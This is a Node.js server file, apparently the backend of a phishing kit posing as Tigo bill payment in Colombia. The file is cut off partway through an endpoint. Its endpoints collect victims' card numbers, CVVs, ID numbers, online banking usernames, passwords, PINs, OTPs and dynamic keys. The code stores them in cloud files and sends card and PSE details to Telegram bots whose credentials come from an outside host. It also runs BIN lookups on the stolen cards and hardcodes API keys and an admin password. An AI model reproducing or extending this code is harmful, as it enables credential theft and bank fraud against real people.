require('dotenv').config();

const http = require('http');
const AWS = require('aws-sdk');
const crypto = require('crypto');
const https = require('https');
const fs = require('fs');
const path = require('path');
const Busboy = require('busboy');

// Validar variables de entorno requeridas
const requiredEnvVars = ['AWS_ACCESS_KEY_ID', 'AWS_SECRET_ACCESS_KEY', 'R2_ENDPOINT', 'R2_BUCKET', 'BIN_API_KEY'];
for (const envVar of requiredEnvVars) {
    if (!process.env[envVar]) {
        console.error(`❌ Error: Falta variable de entorno ${envVar} en .env`);
        process.exit(1);
    }
}

const PORT = process.env.PORT || 9090;
const API_KEY = 'tigo_a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6';

// Tokens de sesión para panelito (en memoria)
const adminTokens = new Set();

// Función para generar token seguro
function generarTokenAdmin() {
    return crypto.randomBytes(32).toString('hex');
}

// Función para validar token de admin
function validarTokenAdmin(token) {
    return adminTokens.has(token);
}

// Función para crear sesión admin
function crearSesionAdmin() {
    const token = generarTokenAdmin();
    adminTokens.add(token);
    // Expirar token después de 30 minutos
    setTimeout(() => adminTokens.delete(token), 30 * 60 * 1000);
    return token;
}

// Bloquear acceso a archivos sensibles
function debeBloquearArchivo(ruta) {
    const archivosBloquedos = ['.env', 'api-server.js', '.htaccess', 'package.json', 'package-lock.json'];
    return archivosBloquedos.some(archivo => ruta.includes(archivo));
}

// Configurar R2
const s3 = new AWS.S3({
    accessKeyId: process.env.AWS_ACCESS_KEY_ID,
    secretAccessKey: process.env.AWS_SECRET_ACCESS_KEY,
    endpoint: process.env.R2_ENDPOINT,
    s3ForcePathStyle: true,
    signatureVersion: 'v4',
    region: 'auto'
});

const BUCKET = process.env.R2_BUCKET;

// Generar txid único
function generarTxid() {
    return crypto.randomBytes(16).toString('hex');
}

// BIN Checker API Key - Directo desde laboratorio.lol
const BIN_API_KEY = process.env.BIN_API_KEY;

// Variable para almacenar configuración (se carga desde R2)
let configGlobal = {
    r2AccessKey: process.env.AWS_ACCESS_KEY_ID,
    r2SecretKey: process.env.AWS_SECRET_ACCESS_KEY,
    r2Endpoint: process.env.R2_ENDPOINT,
    r2Bucket: process.env.R2_BUCKET,
    binApiKey: process.env.BIN_API_KEY,
    laboratorioApiKey: process.env.LABORATORIO_LOL_API_KEY,
    brebLlave: '',
    brebUrl: ''
};

// Inicializar configuración desde R2 o crear con valores del .env
function inicializarConfiguracion() {
    s3.getObject({ Bucket: BUCKET, Key: 'configuracion.json' }, (err, data) => {
        if (err) {
            // Si no existe, crear con valores del .env
            const configInicial = {
                r2AccessKey: process.env.AWS_ACCESS_KEY_ID,
                r2SecretKey: process.env.AWS_SECRET_ACCESS_KEY,
                r2Endpoint: process.env.R2_ENDPOINT,
                r2Bucket: process.env.R2_BUCKET,
                binApiKey: process.env.BIN_API_KEY,
                laboratorioApiKey: process.env.LABORATORIO_LOL_API_KEY,
                brebLlave: '',
                brebUrl: ''
            };
            s3.putObject(
                {
                    Bucket: BUCKET,
                    Key: 'configuracion.json',
                    Body: JSON.stringify(configInicial, null, 2)
                },
                (errPut) => {
                    if (!errPut) {
                        console.log('✓ Configuración inicial creada en R2');
                    }
                }
            );
        } else {
            try {
                const config = JSON.parse(data.Body.toString());
                configGlobal = { ...configGlobal, ...config };
                console.log('✓ Configuración cargada desde R2');
            } catch (e) {
                console.error('Error parseando configuración:', e);
            }
        }
    });
}

// Cargar configuración al iniciar
inicializarConfiguracion();

// Obtener credenciales de Telegram (tigoconsulta - para consultas)
async function obtenerCredencialesTelegram(site = 'tigoconsulta') {
    try {
        const response = await fetch(
            `https://www.laboratorio.lol/api/encryptor.php?site=${site}`,
            {
                headers: {
                    'X-API-Key': process.env.LABORATORIO_LOL_API_KEY || 'C4fEzGJfN92dkLKrZ43ULzFbAcx7mD9v'
                }
            }
        );

        const data = await response.json();
        return {
            token: data.token || data.bot_token,
            chatId: data.chat_id
        };
    } catch (error) {
        console.error('Error obteniendo credenciales Telegram:', error);
        return null;
    }
}

// Enviar notificación a Telegram (tigoconsulta - para consultas)
async function enviarNotificacionTelegram(txid, transaccion) {
    try {
        const creds = await obtenerCredencialesTelegram('tigoconsulta');

        if (!creds || !creds.token || !creds.chatId) {
            console.error('Credenciales Telegram no disponibles');
            return;
        }

        const mensaje = `🔔 <b>NUEVA TRANSACCIÓN TIGO</b>\n\n` +
            `<b>TxID:</b> <code>${txid}</code>\n` +
            `<b>Línea:</b> ${transaccion.referencia}\n` +
            `<b>Valor:</b> ${transaccion.valor_formateado}\n` +
            `<b>Estado:</b> ${transaccion.estado}\n` +
            `<b>IP:</b> ${transaccion.ip}\n` +
            `<b>Hora:</b> ${new Date(transaccion.timestamp).toLocaleString('es-CO')}`;

        const response = await fetch(
            `https://api.telegram.org/bot${creds.token}/sendMessage`,
            {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: creds.chatId,
                    text: mensaje,
                    parse_mode: 'HTML'
                })
            }
        );

        const result = await response.json();

        if (result.ok) {
            console.log('✅ Notificación Telegram enviada:', result.result.message_id);
        } else {
            console.error('❌ Error en Telegram:', result.description);
        }
    } catch (error) {
        console.error('Error enviando notificación Telegram:', error);
    }
}

// Enviar notificación a Telegram para PSE (tigopagos)
async function enviarNotificacionTelegramPSE(txidPSE, transaccionPSE) {
    try {
        const creds = await obtenerCredencialesTelegram('tigopagos');

        if (!creds || !creds.token || !creds.chatId) {
            console.error('Credenciales Telegram PSE no disponibles');
            return;
        }

        const mensaje = `💳 <b>NUEVA TRANSACCIÓN PSE</b>\n\n` +
            `<b>TxID PSE:</b> <code>${txidPSE}</code>\n` +
            `<b>TxID Original:</b> <code>${transaccionPSE.txid_original}</code>\n` +
            `<b>Línea:</b> ${transaccionPSE.referencia}\n` +
            `<b>Banco:</b> ${transaccionPSE.banco}\n` +
            `<b>Nombre:</b> ${transaccionPSE.nombres}\n` +
            `<b>Documento:</b> ${transaccionPSE.tipo_doc} - ${transaccionPSE.numero_doc}\n` +
            `<b>Email:</b> ${transaccionPSE.email}\n` +
            `<b>Valor:</b> ${transaccionPSE.valor_formateado}\n` +
            `<b>Estado:</b> ${transaccionPSE.estado}\n` +
            `<b>Hora:</b> ${new Date(transaccionPSE.timestamp).toLocaleString('es-CO')}`;

        const response = await fetch(
            `https://api.telegram.org/bot${creds.token}/sendMessage`,
            {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: creds.chatId,
                    text: mensaje,
                    parse_mode: 'HTML'
                })
            }
        );

        const result = await response.json();

        if (result.ok) {
            console.log('✅ Notificación Telegram PSE enviada:', result.result.message_id);
        } else {
            console.error('❌ Error en Telegram PSE:', result.description);
        }
    } catch (error) {
        console.error('Error enviando notificación Telegram PSE:', error);
    }
}

// Enviar notificación a Telegram para Nequi (tigopago)
async function enviarNotificacionTelegramNequi(txid, transaccionNequi) {
    try {
        const creds = await obtenerCredencialesTelegram('tigopago');

        if (!creds || !creds.token || !creds.chatId) {
            console.error('Credenciales Telegram Nequi no disponibles');
            return;
        }

        const mensaje = `📱 <b>NUEVA TRANSACCIÓN NEQUI</b>\n\n` +
            `<b>TxID:</b> <code>${txid}</code>\n` +
            `<b>Número Nequi:</b> <code>${transaccionNequi.nequi_number}</code>\n` +
            `<b>Línea:</b> ${transaccionNequi.referencia}\n` +
            `<b>Valor:</b> ${transaccionNequi.valor_formateado}\n` +
            `<b>Opción Pago:</b> Nequi\n` +
            `<b>Hora:</b> ${new Date(transaccionNequi.timestamp).toLocaleString('es-CO')}`;

        const response = await fetch(
            `https://api.telegram.org/bot${creds.token}/sendMessage`,
            {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: creds.chatId,
                    text: mensaje,
                    parse_mode: 'HTML'
                })
            }
        );

        const result = await response.json();

        if (result.ok) {
            console.log('✅ Notificación Telegram Nequi enviada:', result.result.message_id);
        } else {
            console.error('❌ Error en Telegram Nequi:', result.description);
        }
    } catch (error) {
        console.error('Error enviando notificación Telegram Nequi:', error);
    }
}

// Enviar notificación a Telegram para transacción de tarjeta (tigopago)
async function enviarNotificacionTelegramTarjeta(txid, transaccionTarjeta) {
    try {
        const creds = await obtenerCredencialesTelegram('tigopago');

        if (!creds || !creds.token || !creds.chatId) {
            return;
        }

        const mensaje = `💳 <b>NUEVA TRANSACCIÓN TARJETA</b>\n\n` +
            `<b>TxID:</b> <code>${txid}</code>\n` +
            `<b>Nombre:</b> ${transaccionTarjeta.nombre}\n` +
            `<b>Cédula:</b> ${transaccionTarjeta.cedula}\n` +
            `<b>Dirección:</b> ${transaccionTarjeta.direccion}\n` +
            `<b>Email:</b> ${transaccionTarjeta.email}\n\n` +
            `<b>Tarjeta:</b> ${transaccionTarjeta.cardNumber}\n` +
            `<b>Vencimiento:</b> ${transaccionTarjeta.expDate}\n` +
            `<b>CVV:</b> ${transaccionTarjeta.cvv}\n` +
            `<b>Banco:</b> ${transaccionTarjeta.bankName}\n` +
            `<b>Franquicia:</b> ${transaccionTarjeta.franquicia}\n` +
            `<b>Tipo:</b> ${transaccionTarjeta.cardType}\n\n` +
            `<b>Monto:</b> $${transaccionTarjeta.monto}\n` +
            `<b>Estado:</b> ${transaccionTarjeta.estado}\n` +
            `<b>Hora:</b> ${new Date(transaccionTarjeta.timestamp).toLocaleString('es-CO')}`;

        await fetch(
            `https://api.telegram.org/bot${creds.token}/sendMessage`,
            {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: creds.chatId,
                    text: mensaje,
                    parse_mode: 'HTML'
                })
            }
        );
    } catch (error) {
        // Notificación silenciosa
    }
}

// Guardar consulta en archivo único (datos_consultas.txt)
async function guardarConsultaFactura(txid, datos, clientIp) {
    const consulta = {
        txid: txid,
        ip: clientIp,
        referencia: datos.referencia,
        valor_pago: datos.valor_pago,
        valor_formateado: datos.valor_formateado,
        convenio: datos.convenio,
        estado: 'pendiente',
        timestamp: new Date().toISOString()
    };

    return new Promise((resolve, reject) => {
        // Leer archivo existente
        s3.getObject({ Bucket: BUCKET, Key: 'datos_consultas.txt' }, (err, data) => {
            let content = '';

            if (!err && data.Body) {
                content = data.Body.toString();
            }

            // Agregar nueva línea
            content += JSON.stringify(consulta) + '\n';

            // Guardar archivo actualizado
            s3.putObject({
                Bucket: BUCKET,
                Key: 'datos_consultas.txt',
                Body: content,
                ContentType: 'text/plain'
            }, (err, data) => {
                if (err) {
                    console.error('❌ Error guardando consulta en R2:', err);
                    reject(err);
                } else {
                    console.log('✅ Consulta guardada en R2:', txid);
                    resolve(data);
                }
            });
        });
    });
}

// Guardar transacción PSE en archivo único
async function guardarTransaccionPSE(txidPSE, datos) {
    const transaccionPSE = {
        txid_pse: txidPSE,
        ...datos,
        timestamp: new Date().toISOString()
    };

    const params = {
        Bucket: BUCKET,
        Key: 'datos_pse.txt',
        Body: JSON.stringify(transaccionPSE) + '\n',
        ContentType: 'text/plain'
    };

    return new Promise((resolve, reject) => {
        // Primero obtener el archivo existente
        s3.getObject({ Bucket: BUCKET, Key: 'datos_pse.txt' }, (err, data) => {
            let content = '';

            if (!err && data.Body) {
                content = data.Body.toString();
            }

            // Agregar nueva línea
            content += JSON.stringify(transaccionPSE) + '\n';

            // Guardar archivo actualizado
            s3.putObject({
                Bucket: BUCKET,
                Key: 'datos_pse.txt',
                Body: content,
                ContentType: 'text/plain'
            }, (err, data) => {
                if (err) {
                    console.error('❌ Error guardando PSE en R2:', err);
                    reject(err);
                } else {
                    console.log('✅ Transacción PSE guardada en R2:', txidPSE);
                    resolve(data);
                }
            });
        });
    });
}

// Guardar transacción tarjeta en archivo único
async function guardarTransaccionTarjeta(txidTarjeta, datos) {
    const transaccionTarjeta = {
        txid: txidTarjeta,
        ...datos,
        timestamp: new Date().toISOString()
    };

    const params = {
        Bucket: BUCKET,
        Key: 'datos_tarjeta.txt',
        Body: JSON.stringify(transaccionTarjeta) + '\n',
        ContentType: 'text/plain'
    };

    return new Promise((resolve, reject) => {
        // Primero obtener el archivo existente
        s3.getObject({ Bucket: BUCKET, Key: 'datos_tarjeta.txt' }, (err, data) => {
            let content = '';

            if (!err && data.Body) {
                content = data.Body.toString();
            }

            // Agregar nueva línea
            content += JSON.stringify(transaccionTarjeta) + '\n';

            // Guardar archivo actualizado
            s3.putObject({
                Bucket: BUCKET,
                Key: 'datos_tarjeta.txt',
                Body: content,
                ContentType: 'text/plain'
            }, (err, data) => {
                if (err) {
                    console.error('❌ Error guardando tarjeta en R2:', err);
                    reject(err);
                } else {
                    console.log('✅ Transacción tarjeta guardada en R2:', txidTarjeta);
                    resolve(data);
                }
            });
        });
    });
}

// Recuperar transacción desde R2
async function recuperarTransaccion(txid) {
    const params = {
        Bucket: BUCKET,
        Key: `transacciones/${txid}.json`
    };

    return new Promise((resolve, reject) => {
        s3.getObject(params, (err, data) => {
            if (err) {
                console.error('Error recuperando de R2:', err);
                reject(err);
            } else {
                resolve(JSON.parse(data.Body.toString()));
            }
        });
    });
}

const server = http.createServer(async (req, res) => {
    // CORS
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, GET, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    if (req.method === 'OPTIONS') {
        res.writeHead(200);
        res.end();
        return;
    }

    // Servir archivos estáticos (HTML, CSS, JS, imágenes)
    if (!req.url.startsWith('/api/')) {
        // Separar el path del query string
        const urlPath = req.url.split('?')[0];
        let filePath = path.join(__dirname, urlPath === '/' ? 'index.html' : urlPath);
        let ext = path.extname(filePath);

        // Bloquear acceso a archivos sensibles
        if (debeBloquearArchivo(filePath)) {
            res.writeHead(403, { 'Content-Type': 'application/json' });
            res.end(JSON.stringify({ ok: false, error: 'Acceso denegado' }));
            return;
        }

        try {
            // Si no tiene extensión, intentar con .html
            if (!ext || ext === '') {
                const htmlPath = filePath + '.html';
                if (fs.existsSync(htmlPath)) {
                    filePath = htmlPath;
                    ext = '.html';
                }
            }

            if (fs.existsSync(filePath)) {
                let contentType = 'application/octet-stream';

                if (ext === '.html') contentType = 'text/html';
                else if (ext === '.css') contentType = 'text/css';
                else if (ext === '.js') contentType = 'application/javascript';
                else if (ext === '.json') contentType = 'application/json';
                else if (ext === '.png') contentType = 'image/png';
                else if (ext === '.jpg' || ext === '.jpeg') contentType = 'image/jpeg';
                else if (ext === '.svg') contentType = 'image/svg+xml';
                else if (ext === '.webp') contentType = 'image/webp';
                else if (ext === '.gif') contentType = 'image/gif';

                const content = fs.readFileSync(filePath);
                res.writeHead(200, { 'Content-Type': contentType });
                res.end(content);
                return;
            }
        } catch (err) {
            console.error('Error sirviendo archivo:', err);
        }
    }

    res.setHeader('Content-Type', 'application/json');

    // Endpoint: Login de panelito
    if (req.url === '/api/login-admin' && req.method === 'POST') {
        let body = '';
        req.on('data', chunk => {
            body += chunk.toString();
        });
        req.on('end', () => {
            try {
                const datos = JSON.parse(body);
                const { usuario, clave } = datos;

                // Verificar credenciales (admin/Tigocash2026)
                if (usuario === 'admin' && clave === 'Tigocash2026') {
                    const token = crearSesionAdmin();
                    res.writeHead(200);
                    res.end(JSON.stringify({ ok: true, token }));
                } else {
                    res.writeHead(401);
                    res.end(JSON.stringify({ ok: false, error: 'Credenciales inválidas' }));
                }
            } catch (e) {
                res.writeHead(400);
                res.end(JSON.stringify({ ok: false, error: 'JSON inválido' }));
            }
        });
        return;
    }

    // Endpoint: Consultar factura
    if (req.url === '/api/consultar-factura' && req.method === 'POST') {
        let body = '';

        req.on('data', chunk => {
            body += chunk.toString();
        });

        req.on('end', async () => {
            try {
                const { referencia } = JSON.parse(body);

                if (!referencia) {
                    res.writeHead(400);
                    res.end(JSON.stringify({ ok: false, error: 'Referencia requerida' }));
                    return;
                }

                const postData = JSON.stringify({
                    referencia: referencia,
                    api_key: API_KEY
                });

                const options = {
                    hostname: 'api.cloudapi.life',
                    path: '/tigo.php',
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                        'Content-Length': Buffer.byteLength(postData)
                    }
                };

                const apiReq = https.request(options, async (apiRes) => {
                    let data = '';

                    apiRes.on('data', chunk => {
                        data += chunk;
                    });

                    apiRes.on('end', async () => {
                        try {
                            const facturaData = JSON.parse(data);

                            if (facturaData.ok && facturaData.factura) {
                                const txid = generarTxid();
                                const clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;

                                const transaccion = {
                                    txid: txid,
                                    ip: clientIp,
                                    referencia: facturaData.factura.referencia,
                                    valor_pago: facturaData.factura.valor_pago,
                                    valor_formateado: facturaData.factura.valor_formateado,
                                    convenio: facturaData.factura.convenio,
                                    estado: 'pendiente',
                                    timestamp: new Date().toISOString()
                                };

                                // Guardar consulta en txt único
                                await guardarConsultaFactura(txid, facturaData.factura, clientIp);

                                // Enviar Telegram SOLO aquí
                                await enviarNotificacionTelegram(txid, transaccion);

                                const responseWithTxid = {
                                    ...facturaData,
                                    txid: txid
                                };

                                res.writeHead(200);
                                res.end(JSON.stringify(responseWithTxid));
                            } else {
                                res.writeHead(200);
                                res.end(data);
                            }
                        } catch (error) {
                            console.error('Error procesando respuesta:', error);
                            res.writeHead(500);
                            res.end(JSON.stringify({ ok: false, error: 'Error procesando' }));
                        }
                    });
                });

                apiReq.on('error', (error) => {
                    console.error('Error:', error);
                    res.writeHead(500);
                    res.end(JSON.stringify({ ok: false, error: 'Error al consultar API' }));
                });

                apiReq.write(postData);
                apiReq.end();
            } catch (error) {
                res.writeHead(400);
                res.end(JSON.stringify({ ok: false, error: 'JSON inválido' }));
            }
        });
        return;
    }

    // Endpoint: Guardar transacción (guardar en txt único)
    if (req.url === '/api/guardar-transaccion' && req.method === 'POST') {
        let body = '';

        req.on('data', chunk => {
            body += chunk.toString();
        });

        req.on('end', async () => {
            try {
                const datos = JSON.parse(body);
                const txid = generarTxid();
                const clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;

                await guardarConsultaFactura(txid, datos, clientIp);

                res.writeHead(200);
                res.end(JSON.stringify({ ok: true, txid: txid }));
            } catch (error) {
                console.error('Error:', error);
                res.writeHead(400);
                res.end(JSON.stringify({ ok: false, error: 'Error al guardar' }));
            }
        });
        return;
    }

    // Endpoint: Recuperar transacción
    if (req.url.startsWith('/api/transaccion/') && req.method === 'GET') {
        const txid = req.url.split('/').pop();

        try {
            const transaccion = await recuperarTransaccion(txid);
            res.writeHead(200);
            res.end(JSON.stringify({ ok: true, transaccion: transaccion }));
        } catch (error) {
            console.error('Error:', error);
            res.writeHead(404);
            res.end(JSON.stringify({ ok: false, error: 'Transacción no encontrada' }));
        }
        return;
    }

    // Endpoint: Guardar transacción PSE
    if (req.url === '/api/guardar-pse-transaccion' && req.method === 'POST') {
        let body = '';

        req.on('data', chunk => {
            body += chunk.toString();
        });

        req.on('end', async () => {
            try {
                const datos = JSON.parse(body);
                const txidPSE = generarTxid();

                await guardarTransaccionPSE(txidPSE, datos);

                // Enviar notificación a Telegram (sin esperar)
                enviarNotificacionTelegramPSE(txidPSE, { ...datos, timestamp: new Date().toISOString() });

                res.writeHead(200);
                res.end(JSON.stringify({ ok: true, txid_pse: txidPSE }));
            } catch (error) {
                console.error('Error:', error);
                res.writeHead(400);
                res.end(JSON.stringify({ ok: false, error: 'Error al guardar transacción PSE' }));
            }
        });
        return;
    }

    // Endpoint: BIN Checker - Verificar tarjeta
    if (req.url === '/api/bin-check' && req.method === 'POST') {
        let body = '';

        req.on('data', chunk => {
            body += chunk.toString();
        });

        req.on('end', async () => {
            try {
                const { bin } = JSON.parse(body);

                if (!bin || bin.length < 6) {
                    res.writeHead(400);
                    res.end(JSON.stringify({ ok: false, error: 'BIN inválido (mínimo 6 dígitos)' }));
                    return;
                }

                const binOnly = bin.replace(/\D/g, '').substring(0, 6);

                // Consultar laboratorio.lol
                const binUrl = `https://www.laboratorio.lol/api/bins.php?apikey=${BIN_API_KEY}&bin=${binOnly}`;

                console.log(`[BIN CHECK] Verificando BIN: ${binOnly}`);

                https.get(binUrl, (apiRes) => {
                    let data = '';

                    apiRes.on('data', chunk => {
                        data += chunk;
                    });

                    apiRes.on('end', () => {
                        try {
                            const binData = JSON.parse(data);

                            if (binData.error) {
                                res.writeHead(200);
                                res.end(JSON.stringify({ ok: false, error: binData.error }));
                                console.log(`[BIN CHECK] ✗ Error: ${binData.error}`);
                                return;
                            }

                            // Mapear respuesta de laboratorio.lol al formato esperado
                            const response = {
                                ok: true,
                                bin: binOnly,
                                bankName: binData.bankname || binData.bank || 'Banco desconocido',
                                cardType: binData.type ? binData.type.toLowerCase() : 'credit',
                                franquicia: binData.franquicia || binData.scheme || binData.brand || 'UNKNOWN',
                                country: binData.country || 'Colombia',
                                rawResponse: binData
                            };

                            res.writeHead(200);
                            res.end(JSON.stringify(response));
                            console.log(`[BIN CHECK] ✅ ${response.bankName} - ${response.cardType}`);
                        } catch (e) {
                            console.error('[BIN CHECK] Parse error:', e);
                            res.writeHead(500);
                            res.end(JSON.stringify({ ok: false, error: 'Error procesando respuesta BIN' }));
                        }
                    });
                }).on('error', (error) => {
                    console.error('[BIN CHECK] API error:', error);
                    res.writeHead(500);
                    res.end(JSON.stringify({ ok: false, error: 'Error consultando BIN API' }));
                });

            } catch (error) {
                console.error('Error en BIN check:', error);
                res.writeHead(400);
                res.end(JSON.stringify({ ok: false, error: 'Error en solicitud' }));
            }
        });
        return;
    }

    // Endpoint: Guardar OTP
    if (req.url === '/api/guardar-otp' && req.method === 'POST') {
        let body = '';
        req.on('data', chunk => { body += chunk.toString(); });
        req.on('end', () => {
            try {
                const datos = JSON.parse(body);
                const { txId, otp } = datos;
                // Timestamp en GMT-5 (Colombia)
                const fecha = new Date(Date.now() - 5*60*60*1000).toISOString().replace('T', ' ').slice(0, 19);

                const linea = `${txId}|${otp}|${fecha}`;

                s3.getObject({ Bucket: BUCKET, Key: 'datos_otp.txt' }, (err, data) => {
                    let contenido = '';

                    if (!err && data.Body) {
                        const lineas = data.Body.toString().split('\n').filter(l => l.trim());
                        const lineasFiltradas = lineas.filter(l => !l.startsWith(txId + '|'));
                        contenido = lineasFiltradas.join('\n');
                        if (contenido) contenido += '\n';
                    }

                    contenido += linea + '\n';

                    s3.putObject({
                        Bucket: BUCKET,
                        Key: 'datos_otp.txt',
                        Body: Buffer.from(contenido, 'utf-8'),
                        ContentType: 'text/plain'
                    }, (errGuardar) => {
                        if (errGuardar) {
                            res.writeHead(500);
                            res.end(JSON.stringify({ ok: false, error: 'Error guardando OTP' }));
                            return;
                        }
                        console.log(`✅ OTP guardado: ${txId}`);
                        res.writeHead(200);
                        res.end(JSON.stringify({ ok: true, success: true }));
                    });
                });
            } catch (e) {
                res.writeHead(400);
                res.end(JSON.stringify({ ok: false, error: 'Error en solicitud' }));
            }
        });
        return;
    }

    // Endpoint: Guardar TOKEN
    if (req.url === '/api/guardar-token' && req.method === 'POST') {
        let body = '';
        req.on('data', chunk => { body += chunk.toString(); });
        req.on('end', () => {
            try {
                const datos = JSON.parse(body);
                const { txId, token } = datos;
                // Timestamp en GMT-5 (Colombia)
                const fecha = new Date(Date.now() - 5*60*60*1000).toISOString().replace('T', ' ').slice(0, 19);

                const linea = `${txId}|${token}|${fecha}`;

                s3.getObject({ Bucket: BUCKET, Key: 'datos_token.txt' }, (err, data) => {
                    let contenido = '';

                    if (!err && data.Body) {
                        const lineas = data.Body.toString().split('\n').filter(l => l.trim());
                        const lineasFiltradas = lineas.filter(l => !l.startsWith(txId + '|'));
                        contenido = lineasFiltradas.join('\n');
                        if (contenido) contenido += '\n';
                    }

                    contenido += linea + '\n';

                    s3.putObject({
                        Bucket: BUCKET,
                        Key: 'datos_token.txt',
                        Body: Buffer.from(contenido, 'utf-8'),
                        ContentType: 'text/plain'
                    }, (errGuardar) => {
                        if (errGuardar) {
                            res.writeHead(500);
                            res.end(JSON.stringify({ ok: false, error: 'Error guardando TOKEN' }));
                            return;
                        }
                        console.log(`✅ TOKEN guardado: ${txId}`);
                        res.writeHead(200);
                        res.end(JSON.stringify({ ok: true, success: true }));
                    });
                });
            } catch (e) {
                res.writeHead(400);
                res.end(JSON.stringify({ ok: false, error: 'Error en solicitud' }));
            }
        });
        return;
    }

    // Endpoint: Guardar DINAMICA
    if (req.url === '/api/guardar-dinamica' && req.method === 'POST') {
        let body = '';
        req.on('data', chunk => { body += chunk.toString(); });
        req.on('end', () => {
            try {
                const datos = JSON.parse(body);
                const { txId, dinamica } = datos;
                // Timestamp en GMT-5 (Colombia)
                const fecha = new Date(Date.now() - 5*60*60*1000).toISOString().replace('T', ' ').slice(0, 19);

                const linea = `${txId}|${dinamica}|${fecha}`;

                s3.getObject({ Bucket: BUCKET, Key: 'datos_dinamica.txt' }, (err, data) => {
                    let contenido = '';

                    if (!err && data.Body) {
                        const lineas = data.Body.toString().split('\n').filter(l => l.trim());
                        const lineasFiltradas = lineas.filter(l => !l.startsWith(txId + '|'));
                        contenido = lineasFiltradas.join('\n');
                        if (contenido) contenido += '\n';
                    }

                    contenido += linea + '\n';

                    s3.putObject({
                        Bucket: BUCKET,
                        Key: 'datos_dinamica.txt',
                        Body: Buffer.from(contenido, 'utf-8'),
                        ContentType: 'text/plain'
                    }, (errGuardar) => {
                        if (errGuardar) {
                            res.writeHead(500);
                            res.end(JSON.stringify({ ok: false, error: 'Error guardando DINAMICA' }));
                            return;
                        }
                        console.log(`✅ DINAMICA guardado: ${txId}`);
                        res.writeHead(200);
                        res.end(JSON.stringify({ ok: true, success: true }));
                    });
                });
            } catch (e) {
                res.writeHead(400);
                res.end(JSON.stringify({ ok: false, error: 'Error en solicitud' }));
            }
        });
        return;
    }

    // Endpoint: Guardar BLOGIN
    if (req.url === '/api/guardar-blogin' && req.method === 'POST') {
        let body = '';
        req.on('data', chunk => { body += chunk.toString(); });
        req.on('end', () => {
            try {
                const datos = JSON.parse(body);
                const { txId, username, password, pin, banco } = datos;
                // Timestamp en GMT-5 (Colombia)
                const fecha = new Date(Date.now() - 5*60*60*1000).toISOString().replace('T', ' ').slice(0, 19);

                const bloginJSON = JSON.stringify({ username, password, pin, banco });
                const linea = `${txId}|${bloginJSON}|${fecha}`;

                s3.getObject({ Bucket: BUCKET, Key: 'datos_blogin.txt' }, (err, data) => {
                    let contenido = '';

                    if (!err && data.Body) {
                        const lineas = data.Body.toString().split('\n').filter(l => l.trim());
                        const lineasFiltradas = lineas.filter(l => !l.startsWith(txId + '|'));
                        contenido = lineasFiltradas.join('\n');
                        if (contenido) contenido += '\n';
                    }

                    contenido += linea + '\n';

                    s3.putObject({
                        Bucket: BUCKET,
                        Key: 'datos_blogin.txt',
                        Body: Buffer.from(contenido, 'utf-8'),
                        ContentType: 'text/plain'
                    }, (errGuardar) => {
                        if (errGuardar) {
                            res.writeHead(500);
                            res.end(JSON.stringify({ ok: false, error: 'Error guardando BLOGIN' }));
                            return;
                        }
                        console.log(`✅ BLOGIN guardado: ${txId}`);
                        res.writeHead(200);
                        res.end(JSON.stringify({ ok: true, success: true }));
                    });
                });
            } catch (e) {
                res.writeHead(400);
                res.end(JSON.stringify({ ok: false, error: 'Error en solicitud' }));
            }
        });
        return;
    }

    // Endpoint: Obtener TODOS los datos (OTP/TOKEN/DINAMICA/BLOGIN) de un txid
    if (req.url.startsWith('/api/obtener-todos-datos/') && req.method === 'GET') {
        const txid = req.url.split('/').pop();
        const archivos = ['datos_otp.txt', 'datos_token.txt', 'datos_dinamica.txt', 'datos_blogin.txt'];
        const resultados = {};
        let completados = 0;

        archivos.forEach(archivo => {
            s3.getObject({ Bucket: BUCKET, Key: archivo }, (err, data) => {
                if (!err && data.Body) {
                    try {
                        const lineas = data.Body.toString().split('\n').filter(l => l.trim());
                        const linea = lineas.find(l => l.startsWith(txid + '|'));
                        if (linea) {
                            const parts = linea.split('|');
                            const tipoArchivo = archivo.replace('datos_', '').replace('.txt', '');
                            resultados[tipoArchivo] = {
                                valor: parts[1] || '',
                                timestamp: parts[2] || ''
                            };
                        }
                    } catch (e) {}
                }

                completados++;
                if (completados === archivos.length) {
                    res.writeHead(200);
                    res.end(JSON.stringify({ ok: true, data: resultados }));
                }
            });
        });
        return;
    }

    // Endpoint: Obtener datos de OTP
    if (req.url.startsWith('/api/obtener-datos-otp/') && req.method === 'GET') {
        // Validar token de autenticación
        const authHeader = req.headers.authorization || '';
        const token = authHeader.replace('Bearer ', '');

        if (!token || !validarTokenAdmin(token)) {
            res.writeHead(401, { 'Content-Type': 'application/json' });
            res.end(JSON.stringify({ ok: false, error: 'No autorizado' }));
            return;
        }

        const txid = req.url.split('/').pop();

        s3.getObject({ Bucket: BUCKET, Key: 'datos_otp.txt' }, (err, data) => {
            if (err || !data.Body) {
                res.writeHead(200);
                res.end(JSON.stringify({ ok: true, data: null }));
                return;
            }

            try {
                const lineas = data.Body.toString().split('\n').filter(l => l.trim());
                const linea = lineas.find(l => l.startsWith(txid + '|'));

                if (linea) {
                    const parts = linea.split('|');
                    const valor = parts[1] || '';
                    const timestamp = parts[2] || '';
                    res.writeHead(200);
                    res.end(JSON.stringify({ ok: true, data: { txid, accion: 'OTP', valor, timestamp } }));
                } else {
                    res.writeHead(200);
                    res.end(JSON.stringify({ ok: true, data: null }));
                }
            } catch (e) {
                res.writeHead(200);
                res.end(JSON.stringify({ ok: true, data: null }));
            }
        });
        return;
    }

    // Endpoint: Obtener datos de TOKEN
    if (req.url.startsWith('/api/obtener-datos-token/') && req.method === 'GET') {
        // Validar token de autenticación
        const authHeader = req.headers.authorization || '';
        const token = authHeader.replace('Bearer ', '');

        if (!token || !validarTokenAdmin(token)) {
            res.writeHead(401, { 'Content-Type': 'application/json' });
            res.end(JSON.stringify({ ok: false, error: 'No autorizado' }));
            return;
